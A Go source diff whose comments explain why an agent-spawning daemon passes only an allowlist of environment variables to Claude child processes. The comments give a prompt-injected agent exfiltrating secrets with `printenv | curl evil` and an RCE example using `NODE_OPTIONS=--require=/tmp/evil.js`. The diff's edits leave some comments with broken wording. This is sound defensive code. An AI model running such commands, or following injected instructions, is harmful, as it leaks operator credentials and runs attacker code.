@@ -18,7 +18,7 @@ import (
 // Why an allowlist instead of pass-through: `claude` (and any sibling driver
 // invoked here) runs with `--permission-mode bypassPermissions` plus Bash
 // tool access — a prompt-injected agent can `printenv | curl evil`. The
-// daemon's own `os.Environ()` is the operator's full shell environment, so
+// daemon's own `os.Environ` is the operator's full shell environment, so
 // pass-through hands every `AWS_*`, `GH_TOKEN`, `GITHUB_TOKEN`,
 // `OPENAI_API_KEY`, `SSH_AUTH_SOCK`, `AZURE_*`, `GCP_*`, … straight to a
 // process running attacker-controlled instructions. Rounds 4-5 took care to
@@ -47,10 +47,10 @@ var envAllowlist = map[string]struct{}{
 	"SSL_CERT_FILE": {}, // CA bundle override
 	"SSL_CERT_DIR":  {}, // CA bundle override
 	"NODE_PATH":     {}, // node module resolution for claude
-	// NOTE: NODE_OPTIONS was deliberately REMOVED in round 10 — it's an
+	// NOTE: NODE_OPTIONS was deliberately REMOVED in — it's an
 	// RCE pass-through. `NODE_OPTIONS=--require=/tmp/evil.js` executes
 	// arbitrary JS in the claude child at startup, same category as the
-	// SHELL drop in round 9 but executable. Operators who genuinely need a
+	// SHELL drop in but executable. Operators who genuinely need a
 	// node flag set per bot can supply it via `agent.env`, which flows
 	// through `extra` (and is reviewed at config-edit time), not via the
 	// inherited operator environment.
@@ -67,7 +67,7 @@ var envAllowlist = map[string]struct{}{
 }
 
 // mergedEnv returns the agent's spawn environment: the allowlisted subset of
-// the daemon's os.Environ() with `extra` (KEY=VALUE entries) layered on top,
+// the daemon's os.Environ with `extra` (KEY=VALUE entries) layered on top,
 // later entries winning so callers put overrides (e.g. ANTHROPIC_BASE_URL)
 // last. See envAllowlist for why pass-through was retired.
 //
